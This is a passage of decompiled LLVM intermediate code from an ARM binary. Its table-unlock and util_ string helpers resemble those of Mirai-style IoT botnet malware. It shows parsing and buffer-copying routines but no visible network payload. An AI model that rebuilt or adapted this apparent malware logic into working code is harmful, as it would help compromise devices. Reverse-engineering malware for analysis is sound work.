  store i32 %v2_9b08, i32* %r1.global-to-local, align 4
  %v2_9b0c = inttoptr i32 %v0_9b04 to i8*
  %v3_9b0c = call i32 @util_strcpy(i8* %v2_9b0c, i32 %v2_9b08)
  store i32 %v3_9b0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9654

dec_label_pc_9b14:                                ; preds = %dec_label_pc_9938
  %v0_9b14 = load i32, i32* @r4, align 4
  store i32 %v0_9b14, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b368.30 to i32), i32* %r1.global-to-local, align 4
  %v3_9b1c = inttoptr i32 %v0_9b14 to i8*
  %v4_9b1c = call i32 @util_strcmp(i8* %v3_9b1c, i32 ptrtoint ([4 x i8]* @global_var_1b368.30 to i32))
  store i32 %v4_9b1c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9b20 = icmp eq i32 %v4_9b1c, 0
  store i1 %v2_9b20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9b20, label %bb211, label %dec_label_pc_996c

bb211:                                            ; preds = %dec_label_pc_9b14
  %v0_9b28 = load i32, i32* %fp.global-to-local, align 4
  %v1_9b28 = load i32, i32* @r5, align 4
  %v3_9b28 = icmp uge i32 %v0_9b28, %v1_9b28
  store i1 %v3_9b28, i1* %cpsr_c.global-to-local, align 1
  %v9_9b28 = icmp eq i32 %v0_9b28, %v1_9b28
  store i1 %v9_9b28, i1* %cpsr_z.global-to-local, align 1
  %v7_9b2c = icmp sgt i32 %v0_9b28, %v1_9b28
  %. = select i1 %v7_9b2c, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_9b34 = trunc i32 %. to i8
  %v10_9b34 = load i32, i32* @sl, align 4
  %v11_9b34 = add i32 %v10_9b34, -1448
  %v12_9b34 = inttoptr i32 %v11_9b34 to i8*
  store i8 %v9_9b34, i8* %v12_9b34, align 1
  br label %dec_label_pc_9974

dec_label_pc_9b40:                                ; preds = %dec_label_pc_8f38
  %v0_9b40 = load i32, i32* @r4, align 4
  %v1_9b40 = trunc i32 %v0_9b40 to i8
  %v2_9b40 = load i32, i32* @sl, align 4
  %v3_9b40 = add i32 %v2_9b40, -1448
  %v4_9b40 = inttoptr i32 %v3_9b40 to i8*
  store i8 %v1_9b40, i8* %v4_9b40, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9b48:                                ; preds = %dec_label_pc_9a60, %bb207
  %v2_9b4c = phi i32 [ %v1_9a50, %bb207 ], [ %v2_9a74, %dec_label_pc_9a60 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9b4c = inttoptr i32 %v2_9b4c to i8*
  store i8 0, i8* %v3_9b4c, align 1
  br label %dec_label_pc_9a88

dec_label_pc_9b54:                                ; preds = %dec_label_pc_998c
  %v0_9b54 = load i32, i32* @r6, align 4
  store i32 %v0_9b54, i32* %r0.global-to-local, align 4
  %v1_9b58 = inttoptr i32 %v0_9b54 to i8*
  %v2_9b58 = call i32 @util_strlen(i8* %v1_9b58)
  store i32 %v2_9b58, i32* %r0.global-to-local, align 4
  %v2_9b5c = icmp ugt i32 %v2_9b58, 126
  store i1 %v2_9b5c, i1* %cpsr_c.global-to-local, align 1
  %v7_9b5c = icmp eq i32 %v2_9b58, 127
  store i1 %v7_9b5c, i1* %cpsr_z.global-to-local, align 1
  %v8_9b60 = icmp sgt i32 %v2_9b58, 127
  br i1 %v8_9b60, label %dec_label_pc_99ec, label %dec_label_pc_9b64

dec_label_pc_9b64:                                ; preds = %dec_label_pc_9b54
  %v0_9b64 = load i32, i32* @sl, align 4
  %v1_9b64 = add i32 %v0_9b64, 16
  %v2_9b64 = inttoptr i32 %v1_9b64 to i32*
  %v3_9b64 = load i32, i32* %v2_9b64, align 4
  %v1_9b68 = and i32 %v3_9b64, 33554432
  %v2_9b68 = icmp ne i32 %v1_9b68, 0
  store i1 %v2_9b68, i1* %cpsr_c.global-to-local, align 1
  %v3_9b68 = mul i32 %v3_9b64, 128
  %v1_9b6c = add i32 %v3_9b68, 1472
  %v0_9b70 = load i32, i32* @r6, align 4
  store i32 %v0_9b70, i32* %r1.global-to-local, align 4
  %v0_9b74 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b74 = add i32 %v1_9b6c, %v0_9b74
  store i32 %v2_9b74, i32* @r0, align 4
  %v2_9b78 = inttoptr i32 %v2_9b74 to i8*
  %v3_9b78 = call i32 @util_strcpy(i8* %v2_9b78, i32 %v0_9b70)
  store i32 %v3_9b78, i32* %r0.global-to-local, align 4
  %v0_9b7c = load i32, i32* @sl, align 4
  %v1_9b7c = add i32 %v0_9b7c, 16
  %v2_9b7c = inttoptr i32 %v1_9b7c to i32*
  %v3_9b7c = load i32, i32* %v2_9b7c, align 4
  %v1_9b80 = and i32 %v3_9b7c, 33554432
  %v2_9b80 = icmp ne i32 %v1_9b80, 0
  store i1 %v2_9b80, i1* %cpsr_c.global-to-local, align 1
  %v3_9b80 = mul i32 %v3_9b7c, 128
  %v1_9b84 = add i32 %v3_9b80, 1472
  %v0_9b88 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b88 = add i32 %v1_9b84, %v0_9b88
  store i32 %v2_9b88, i32* @r4, align 4
  store i32 %v2_9b88, i32* %r0.global-to-local, align 4
  %v1_9b90 = inttoptr i32 %v2_9b88 to i8*
  %v2_9b90 = call i32 @util_strlen(i8* %v1_9b90)
  store i32 ptrtoint (i32* @global_var_1bbcc.62 to i32), i32* %r1.global-to-local, align 4
  %v0_9b98 = load i32, i32* @r4, align 4
  %v2_9b98 = add i32 %v0_9b98, %v2_9b90
  store i32 %v2_9b98, i32* @r0, align 4
  %v2_9b9c = inttoptr i32 %v2_9b98 to i8*
  %v3_9b9c = call i32 @util_strcpy(i8* %v2_9b9c, i32 ptrtoint (i32* @global_var_1bbcc.62 to i32))
  store i32 %v3_9b9c, i32* %r0.global-to-local, align 4
  %v0_9ba0 = load i32, i32* @r5, align 4
  %v1_9ba0 = add i32 %v0_9ba0, 3
  store i32 %v1_9ba0, i32* @r5, align 4
  %v0_9ba4 = load i32, i32* @sl, align 4
  %v1_9ba4 = add i32 %v0_9ba4, 660
  %v2_9ba4 = inttoptr i32 %v1_9ba4 to i32*
  %v3_9ba4 = load i32, i32* %v2_9ba4, align 4
  %v0_9ba8 = load i32, i32* @r7, align 4
  %v2_9ba8 = add i32 %v0_9ba8, %v1_9ba0
  store i32 %v2_9ba8, i32* @r6, align 4
  %v2_9bac = sub i32 %v3_9ba4, %v1_9ba0
  store i32 %v2_9bac, i32* %r1.global-to-local, align 4
  %v0_9bb0 = load i32, i32* @r8, align 4
  store i32 %v0_9bb0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3a4.59 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9ba8, i32* %r0.global-to-local, align 4
  %v4_9bbc = call i32 @util_memsearch(i32 %v2_9ba8, i32 %v2_9bac, i32 ptrtoint (i32* @global_var_1b3a4.59 to i32), i32 %v0_9bb0)
  store i32 %v4_9bbc, i32* %r0.global-to-local, align 4
  %v0_9bc0 = load i32, i32* @sl, align 4
  %v1_9bc0 = add i32 %v0_9bc0, 16
  %v2_9bc0 = inttoptr i32 %v1_9bc0 to i32*
  %v3_9bc0 = load i32, i32* %v2_9bc0, align 4
  %v1_9bc4 = and i32 %v3_9bc0, 33554432
  %v2_9bc4 = icmp ne i32 %v1_9bc4, 0
  store i1 %v2_9bc4, i1* %cpsr_c.global-to-local, align 1
  %v3_9bc4 = mul i32 %v3_9bc0, 128
  %v1_9bc8 = add i32 %v3_9bc4, 1472
  %v0_9bcc = load i32, i32* %sb.global-to-local, align 4
  %v1_9bcc = load i32, i32* @r5, align 4
  %v2_9bd0 = add i32 %v1_9bc8, %v0_9bcc
  store i32 %v2_9bd0, i32* @r4, align 4
  %v2_9bcc = add i32 %v0_9bcc, %v4_9bbc
  %v2_9bd4 = add i32 %v2_9bcc, %v1_9bcc
  store i32 %v2_9bd4, i32* @r5, align 4
  %v0_9bd8 = load i32, i32* %fp.global-to-local, align 4
  %v1_9bd8 = trunc i32 %v0_9bd8 to i8
  %v3_9bd8 = add i32 %v2_9bd4, 2115
  %v4_9bd8 = inttoptr i32 %v3_9bd8 to i8*
  store i8 %v1_9bd8, i8* %v4_9bd8, align 1
  %v0_9bdc = load i32, i32* @r4, align 4
  store i32 %v0_9bdc, i32* %r0.global-to-local, align 4
  %v1_9be0 = inttoptr i32 %v0_9bdc to i8*
  %v2_9be0 = call i32 @util_strlen(i8* %v1_9be0)
  %v0_9be4 = load i32, i32* @r6, align 4
  store i32 %v0_9be4, i32* %r1.global-to-local, align 4
  %v0_9be8 = load i32, i32* @r4, align 4
  %v2_9be8 = add i32 %v0_9be8, %v2_9be0
  store i32 %v2_9be8, i32* @r0, align 4
  %v2_9bec = inttoptr i32 %v2_9be8 to i8*
  %v3_9bec = call i32 @util_strcpy(i8* %v2_9bec, i32 %v0_9be4)
  store i32 %v3_9bec, i32* %r0.global-to-local, align 4
  %v0_9bf0 = load i32, i32* @sl, align 4
  %v1_9bf0 = add i32 %v0_9bf0, 16
  %v2_9bf0 = inttoptr i32 %v1_9bf0 to i32*
  %v3_9bf0 = load i32, i32* %v2_9bf0, align 4
  %v1_9bf4 = add i32 %v3_9bf0, 1
  store i32 %v1_9bf4, i32* %r3.global-to-local, align 4
  store i32 %v1_9bf4, i32* %v2_9bf0, align 4
  br label %dec_label_pc_99ec

dec_label_pc_9c00:                                ; preds = %dec_label_pc_9644
  %v0_9c00 = load i32, i32* %sb.global-to-local, align 4
  %v1_9c04 = add i32 %v0_9c00, 533
  store i32 %v1_9c04, i32* @r4, align 4
  store i32 %v1_9c04, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9c10 = call i32 @util_zero(i32 %v1_9c04, i32 255)
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9c18 = load i32, i32* %stack_var_-44, align 4
  %v0_9c1c = load i32, i32* @r6, align 4
  %v1_9c1c = add i32 %v0_9c1c, 1
  store i32 %v1_9c1c, i32* @r6, align 4
  %v2_9c20 = add i32 %v1_9c1c, %v3_9c18
  store i32 %v2_9c20, i32* %r0.global-to-local, align 4
  %v1_9c24 = inttoptr i32 %v2_9c20 to i8*
  %v2_9c24 = call i32 @util_strlen(i8* %v1_9c24)
  store i32 %v2_9c24, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9c28 = icmp eq i32 %v2_9c24, 0
  store i1 %v2_9c28, i1* %cpsr_z.global-to-local, align 1
  %tmp212 = icmp slt i32 %v2_9c24, 1
  br i1 %tmp212, label %dec_label_pc_9654, label %dec_label_pc_9c30

dec_label_pc_9c30:                                ; preds = %dec_label_pc_9c00
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9c34 = load i32, i32* %stack_var_-44, align 4
  %v0_9c38 = load i32, i32* @r6, align 4
  %v2_9c38 = add i32 %v0_9c38, %v3_9c34
  store i32 %v2_9c38, i32* %r0.global-to-local, align 4
  %v1_9c3c = inttoptr i32 %v2_9c38 to i8*
  %v2_9c3c = call i32 @util_strlen(i8* %v1_9c3c)
  store i32 %v2_9c3c, i32* %r0.global-to-local, align 4
  %v2_9c40 = icmp ugt i32 %v2_9c3c, 254
  store i1 %v2_9c40, i1* %cpsr_c.global-to-local, align 1
  %v7_9c40 = icmp eq i32 %v2_9c3c, 255
  store i1 %v7_9c40, i1* %cpsr_z.global-to-local, align 1
  %v8_9c44 = icmp sgt i32 %v2_9c3c, 255
  br i1 %v8_9c44, label %dec_label_pc_9654, label %dec_label_pc_9c48

dec_label_pc_9c48:                                ; preds = %dec_label_pc_9c30
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  %v3_9c4c = load i32, i32* %stack_var_-44, align 4
  %v0_9c50 = load i32, i32* @r4, align 4
  store i32 %v0_9c50, i32* @r0, align 4
  %v0_9c54 = load i32, i32* @r6, align 4
  %v2_9c54 = add i32 %v0_9c54, %v3_9c4c
  store i32 %v2_9c54, i32* %r1.global-to-local, align 4
  %v2_9c58 = inttoptr i32 %v0_9c50 to i8*
  %v3_9c58 = call i32 @util_strcpy(i8* %v2_9c58, i32 %v2_9c54)
  store i32 %v3_9c58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9654

dec_label_pc_9c60:                                ; preds = %dec_label_pc_98e0
  store i32 7, i32* @ip, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_9c6c = load i32, i32* @r6, align 4
  %v1_9c6c = add i32 %v0_9c6c, 4
  %v2_9c6c = inttoptr i32 %v1_9c6c to i8*
  %v3_9c6c = load i8, i8* %v2_9c6c, align 1
  %v4_9c6c = zext i8 %v3_9c6c to i32
  store i32 %v4_9c6c, i32* @r3, align 4
  %v2_9c70 = icmp ugt i8 %v3_9c6c, 114
  store i1 %v2_9c70, i1* %cpsr_c.global-to-local, align 1
  %v7_9c70 = icmp eq i8 %v3_9c6c, 115
  store i1 %v7_9c70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c70, label %bb213, label %.thread47

bb213:                                            ; preds = %dec_label_pc_9c60
  store i32 8, i32* @ip, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread47

.thread47:                                        ; preds = %dec_label_pc_9c60, %bb213
  %v3_9c80 = phi i32 [ 7, %dec_label_pc_9c60 ], [ 8, %bb213 ]
  %v1_9c84 = sub nsw i32 1, %v3_9c80
  %v1_9c88 = load i32, i32* @r7, align 4
  %v2_9c88 = add i32 %v1_9c88, %v1_9c84
  store i32 %v2_9c88, i32* @r2, align 4
  %v2_9c8c = add i32 %v3_9c80, %v0_9c6c
  store i32 %v2_9c8c, i32* @r1, align 4
  store i32 %v0_9c6c, i32* @r0, align 4
  %v3_9c94 = call i32 @memmove(i32 %v0_9c6c, i32 %v2_9c8c, i32 %v2_9c88)
  store i32 %v3_9c94, i32* %r0.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v0_9ca4 = load i32, i32* @r5, align 4
  %v1_9ca4 = load i32, i32* @r4, align 4
  %v2_9ca4 = add i32 %v1_9ca4, %v0_9ca4
  %v3_9ca4 = inttoptr i32 %v2_9ca4 to i8*
  %v4_9ca4 = load i8, i8* %v3_9ca4, align 1
  %v6_9ca4 = zext i8 %v4_9ca4 to i32
  store i32 %v6_9ca4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_9ca8 = icmp eq i8 %v4_9ca4, 0
  store i1 %v9_9ca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9ca8, label %dec_label_pc_9ce8, label %dec_label_pc_9cb0

dec_label_pc_9cb0:                                ; preds = %.thread47
  %v2_9cb0 = icmp ugt i8 %v4_9ca4, 46
  store i1 %v2_9cb0, i1* %cpsr_c.global-to-local, align 1
  %v7_9cb0 = icmp eq i8 %v4_9ca4, 47
  store i1 %v7_9cb0, i1* %cpsr_z.global-to-local, align 1
  %v1_9cb4 = load i32, i32* @r6, align 4
  br i1 %v7_9cb0, label %bb214, label %dec_label_pc_9cbc

bb214:                                            ; preds = %dec_label_pc_9cb0
  store i32 %v1_9cb4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9d68

dec_label_pc_9cbc:                                ; preds = %dec_label_pc_9cb0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9ccc

dec_label_pc_9cc4:                                ; preds = %dec_label_pc_9ccc
  %v2_9cc4 = icmp ugt i8 %v4_9cd8, 46
  store i1 %v2_9cc4, i1* %cpsr_c.global-to-local, align 1
  %v7_9cc4 = icmp eq i8 %v4_9cd8, 47
  store i1 %v7_9cc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9cc4, label %dec_label_pc_9d68, label %dec_label_pc_9ccc

dec_label_pc_9ccc:                                ; preds = %dec_label_pc_9cc4, %dec_label_pc_9cbc
  %v0_9ccc = phi i32 [ %v1_9ccc, %dec_label_pc_9cc4 ], [ 0, %dec_label_pc_9cbc ]
  %v1_9ccc = add i32 %v0_9ccc, 1
  store i32 %v1_9ccc, i32* %r1.global-to-local, align 4
  store i32 %v10_82f0, i32* @ip, align 4
  store i32 %v1_9ccc, i32* %stack_var_-44, align 4
  %v2_9cd8 = add i32 %v1_9ccc, %v1_9cb4
  %v3_9cd8 = inttoptr i32 %v2_9cd8 to i8*
  %v4_9cd8 = load i8, i8* %v3_9cd8, align 1
  %v6_9cd8 = zext i8 %v4_9cd8 to i32
  store i32 %v6_9cd8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9cdc = icmp eq i8 %v4_9cd8, 0
  store i1 %v2_9cdc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9cd8, i32* %r2.global-to-local, align 4
  br i1 %v2_9cdc, label %dec_label_pc_9ce8, label %dec_label_pc_9cc4

dec_label_pc_9ce8:                                ; preds = %dec_label_pc_9ccc, %.thread47, %dec_label_pc_9d68
  %v0_9ce8 = load i32, i32* @r6, align 4
  store i32 %v0_9ce8, i32* %r0.global-to-local, align 4
  %v1_9cec = inttoptr i32 %v0_9ce8 to i8*
  %v2_9cec = call i32 @util_strlen(i8* %v1_9cec)
  store i32 %v2_9cec, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9cf0 = icmp eq i32 %v2_9cec, 0
  store i1 %v2_9cf0, i1* %cpsr_z.global-to-local, align 1
  %tmp215 = icmp slt i32 %v2_9cec, 1
  br i1 %tmp215, label %dec_label_pc_9d08, label %dec_label_pc_9cf8

dec_label_pc_9cf8:                                ; preds = %dec_label_pc_9ce8
  %v0_9cf8 = load i32, i32* @r6, align 4
  store i32 %v0_9cf8, i32* %r0.global-to-local, align 4
  %v1_9cfc = inttoptr i32 %v0_9cf8 to i8*
  %v2_9cfc = call i32 @util_strlen(i8* %v1_9cfc)
  store i32 %v2_9cfc, i32* %r0.global-to-local, align 4
  %v2_9d00 = icmp ugt i32 %v2_9cfc, 126
  store i1 %v2_9d00, i1* %cpsr_c.global-to-local, align 1
  %v7_9d00 = icmp eq i32 %v2_9cfc, 127
  store i1 %v7_9d00, i1* %cpsr_z.global-to-local, align 1
  %v7_9d04 = icmp slt i32 %v2_9cfc, 128
  br i1 %v7_9d04, label %dec_label_pc_9ec8, label %dec_label_pc_9d08

dec_label_pc_9d08:                                ; preds = %dec_label_pc_9cf8, %dec_label_pc_9ce8, %dec_label_pc_9ec8
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9d0c = load i32, i32* %stack_var_-44, align 4
  %v0_9d10 = load i32, i32* @r6, align 4
  %v1_9d10 = add i32 %v0_9d10, 1
  store i32 %v1_9d10, i32* @r5, align 4
  %v2_9d14 = add i32 %v1_9d10, %v3_9d0c
  store i32 %v2_9d14, i32* %r0.global-to-local, align 4
  %v1_9d18 = inttoptr i32 %v2_9d14 to i8*
  %v2_9d18 = call i32 @util_strlen(i8* %v1_9d18)
  store i32 %v2_9d18, i32* %r0.global-to-local, align 4
  %v2_9d1c = icmp ugt i32 %v2_9d18, 254
  store i1 %v2_9d1c, i1* %cpsr_c.global-to-local, align 1
  %v7_9d1c = icmp eq i32 %v2_9d18, 255
  store i1 %v7_9d1c, i1* %cpsr_z.global-to-local, align 1
  %v8_9d20 = icmp sgt i32 %v2_9d18, 255
  br i1 %v8_9d20, label %dec_label_pc_9918, label %dec_label_pc_9d24

dec_label_pc_9d24:                                ; preds = %dec_label_pc_9d08
  %v0_9d24 = load i32, i32* %sb.global-to-local, align 4
  %v1_9d28 = add i32 %v0_9d24, 533
  store i32 %v1_9d28, i32* @r4, align 4
  store i32 %v1_9d28, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9d34 = call i32 @util_zero(i32 %v1_9d28, i32 255)
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9d3c = load i32, i32* %stack_var_-44, align 4
  %v0_9d40 = load i32, i32* @r5, align 4
  %v2_9d40 = add i32 %v0_9d40, %v3_9d3c
  store i32 %v2_9d40, i32* %r0.global-to-local, align 4
  %v1_9d44 = inttoptr i32 %v2_9d40 to i8*
  %v2_9d44 = call i32 @util_strlen(i8* %v1_9d44)
  store i32 %v2_9d44, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9d48 = icmp eq i32 %v2_9d44, 0
  store i1 %v2_9d48, i1* %cpsr_z.global-to-local, align 1
  %tmp216 = icmp slt i32 %v2_9d44, 1
  br i1 %tmp216, label %dec_label_pc_9918, label %dec_label_pc_9d50

dec_label_pc_9d50:                                ; preds = %dec_label_pc_9d24
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9d54 = load i32, i32* %stack_var_-44, align 4
  %v0_9d58 = load i32, i32* @r4, align 4
  store i32 %v0_9d58, i32* @r0, align 4
  %v0_9d5c = load i32, i32* @r5, align 4
  %v2_9d5c = add i32 %v0_9d5c, %v3_9d54
  store i32 %v2_9d5c, i32* %r1.global-to-local, align 4
  %v2_9d60 = inttoptr i32 %v0_9d58 to i8*
  %v3_9d60 = call i32 @util_strcpy(i8* %v2_9d60, i32 %v2_9d5c)
  store i32 %v3_9d60, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9918

dec_label_pc_9d68:                                ; preds = %dec_label_pc_9cc4, %bb214
  %v2_9d6c = phi i32 [ %v1_9cb4, %bb214 ], [ %v2_9cd8, %dec_label_pc_9cc4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9d6c = inttoptr i32 %v2_9d6c to i8*
  store i8 0, i8* %v3_9d6c, align 1
  br label %dec_label_pc_9ce8

dec_label_pc_9d74:                                ; preds = %dec_label_pc_9898
  %v1_9d74 = add i32 %v0_9d74, 1
  store i32 %v1_9d74, i32* %ip.global-to-local, align 4
  %v2_9d78 = add i32 %v0_9898, %v1_9d74
  store i32 %v2_9d78, i32* %r4.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 %v2_9d78, i32* %r0.global-to-local, align 4
  store i32 %v1_9d74, i32* %stack_var_-44, align 4
  %v1_9d88 = inttoptr i32 %v2_9d78 to i8*
  %v2_9d88 = call i32 @util_strlen(i8* %v1_9d88)
  store i32 %v2_9d88, i32* %r0.global-to-local, align 4
  %v0_9d8c = load i32, i32* %r4.global-to-local, align 4
  %v2_9d8c = add i32 %v0_9d8c, %v2_9d88
  %v1_9d90 = add i32 %v2_9d8c, -1
  %v2_9d90 = inttoptr i32 %v1_9d90 to i8*
  %v3_9d90 = load i8, i8* %v2_9d90, align 1
  %v4_9d90 = zext i8 %v3_9d90 to i32
  store i32 %v4_9d90, i32* %r3.global-to-local, align 4
  %v2_9d94 = icmp ugt i8 %v3_9d90, 33
  store i1 %v2_9d94, i1* %cpsr_c.global-to-local, align 1
  %v7_9d94 = icmp eq i8 %v3_9d90, 34
  store i1 %v7_9d94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9d94, label %dec_label_pc_9d9c, label %dec_label_pc_98a4

dec_label_pc_9d9c:                                ; preds = %dec_label_pc_9d74
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9da0 = load i32, i32* %stack_var_-44, align 4
  %v0_9da4 = load i32, i32* @r5, align 4
  %v2_9da4 = add i32 %v0_9da4, %v3_9da0
  store i32 %v2_9da4, i32* %r4.global-to-local, align 4
  store i32 %v2_9da4, i32* %r0.global-to-local, align 4
  %v1_9dac = inttoptr i32 %v2_9da4 to i8*
  %v2_9dac = call i32 @util_strlen(i8* %v1_9dac)
  store i32 %v2_9dac, i32* %r0.global-to-local, align 4
  %v2_9db0 = add i32 %v2_9da4, %v2_9dac
  %v0_9db4 = load i32, i32* @r6, align 4
  %v1_9db4 = trunc i32 %v0_9db4 to i8
  %v3_9db4 = add i32 %v2_9db0, -1
  %v4_9db4 = inttoptr i32 %v3_9db4 to i8*
  store i8 %v1_9db4, i8* %v4_9db4, align 1
  br label %dec_label_pc_98a4

dec_label_pc_9dbc:                                ; preds = %dec_label_pc_990c
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9dc0 = load i32, i32* %stack_var_-44, align 4
  %v0_9dc4 = load i32, i32* @r6, align 4
  %v1_9dc4 = add i32 %v0_9dc4, 1
  store i32 %v1_9dc4, i32* @r5, align 4
  %v2_9dc8 = add i32 %v1_9dc4, %v3_9dc0
  store i32 %v2_9dc8, i32* %r0.global-to-local, align 4
  %v1_9dcc = inttoptr i32 %v2_9dc8 to i8*
  %v2_9dcc = call i32 @util_strlen(i8* %v1_9dcc)
  store i32 %v2_9dcc, i32* %r0.global-to-local, align 4
  %v2_9dd0 = icmp ugt i32 %v2_9dcc, 254
  store i1 %v2_9dd0, i1* %cpsr_c.global-to-local, align 1
  %v7_9dd0 = icmp eq i32 %v2_9dcc, 255
  store i1 %v7_9dd0, i1* %cpsr_z.global-to-local, align 1
  %v8_9dd4 = icmp sgt i32 %v2_9dcc, 255
  br i1 %v8_9dd4, label %dec_label_pc_9918, label %dec_label_pc_9dd8

dec_label_pc_9dd8:                                ; preds = %dec_label_pc_9dbc
  %v0_9dd8 = load i32, i32* %sb.global-to-local, align 4
  %v1_9ddc = add i32 %v0_9dd8, 533
  store i32 %v1_9ddc, i32* @r4, align 4
  store i32 %v1_9ddc, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9de8 = call i32 @util_zero(i32 %v1_9ddc, i32 255)
  store i32 %v10_82f0, i32* @ip, align 4
  %v3_9df0 = load i32, i32* %stack_var_-44, align 4
  %v0_9df4 = load i32, i32* @r5, align 4
  %v2_9df4 = add i32 %v0_9df4, %v3_9df0
  store i32 %v2_9df4, i32* %r0.global-to-local, align 4
  %v1_9df8 = inttoptr i32 %v2_9df4 to i8*
  %v2_9df8 = call i32 @util_strlen(i8* %v1_9df8)
  store i32 %v2_9df8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9dfc = icmp eq i32 %v2_9df8, 0
  store i1 %v2_9dfc, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v2_9df8, 1
  br i1 %tmp217, label %dec_label_pc_9918, label %dec_label_pc_9e04

dec_label_pc_9e04:                                ; preds = %dec_label_pc_9dd8
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9e08 = load i32, i32* %stack_var_-44, align 4
  %v0_9e0c = load i32, i32* @r4, align 4
  store i32 %v0_9e0c, i32* @r0, align 4
  %v0_9e10 = load i32, i32* @r5, align 4
  %v2_9e10 = add i32 %v0_9e10, %v3_9e08
  store i32 %v2_9e10, i32* %r1.global-to-local, align 4
  %v2_9e14 = inttoptr i32 %v0_9e0c to i8*
  %v3_9e14 = call i32 @util_strcpy(i8* %v2_9e14, i32 %v2_9e10)
  store i32 %v3_9e14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9918

dec_label_pc_9e1c:                                ; preds = %dec_label_pc_84c0
  store i32 53, i32* %r0.global-to-local, align 4
  %v1_9e20 = call i32 @table_unlock_val(i32 53)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 53, i32* %r0.global-to-local, align 4
  %v3_9e2c = call i32 @table_retrieve_val(i32 53, i32* null)
  store i32 %v3_9e2c, i32* %r1.global-to-local, align 4
  %v0_9e34 = load i32, i32* @r5, align 4
  %v1_9e34 = add i32 %v0_9e34, 20
  store i32 %v1_9e34, i32* @r0, align 4
  %v2_9e38 = inttoptr i32 %v1_9e34 to i8*
  %v3_9e38 = call i32 @util_strcpy(i8* %v2_9e38, i32 %v3_9e2c)
  store i32 53, i32* %r0.global-to-local, align 4
  %v1_9e40 = call i32 @table_lock_val(i32 53)
  store i32 %v1_9e40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9e44

dec_label_pc_9e44:                                ; preds = %dec_label_pc_84c0, %dec_label_pc_9f34, %dec_label_pc_9f08, %dec_label_pc_9edc, %dec_label_pc_9e9c, %dec_label_pc_9e1c
  store i32 %v0_840c, i32* @r0, align 4
  %v0_9e48 = load i32, i32* @r8, align 4
  store i32 %v0_9e48, i32* %r1.global-to-local, align 4
  %v2_9e4c = inttoptr i32 %v0_840c to i8*
  %v3_9e4c = call i32 @util_strcpy(i8* %v2_9e4c, i32 %v0_9e48)
  store i32 %v3_9e4c, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_9e54 = load i32, i32* %fp.global-to-local, align 4
  %v1_9e54 = add i32 %v0_9e54, 1
  store i32 %v1_9e54, i32* %fp.global-to-local, align 4
  %v0_9e58 = load i32, i32* @r5, align 4
  %v3_9e5c = icmp uge i32 %v1_9e54, %v0_839c
  store i1 %v3_9e5c, i1* %cpsr_c.global-to-local, align 1
  %v9_9e5c = icmp eq i32 %v1_9e54, %v0_839c
  store i1 %v9_9e5c, i1* %cpsr_z.global-to-local, align 1
  %v1_9e60 = add i32 %v0_9e58, 3140
  store i32 %v1_9e60, i32* @r5, align 4
  br i1 %v9_9e5c, label %dec_label_pc_9e68, label %dec_label_pc_83cc

dec_label_pc_9e68:                                ; preds = %dec_label_pc_9e44
  %v0_9e78 = load i32, i32* @r7, align 4
  %v1_9e78 = and i32 %v0_9e78, 128
  %v2_9e78 = icmp ne i32 %v1_9e78, 0
  store i1 %v2_9e78, i1* %cpsr_c.global-to-local, align 1
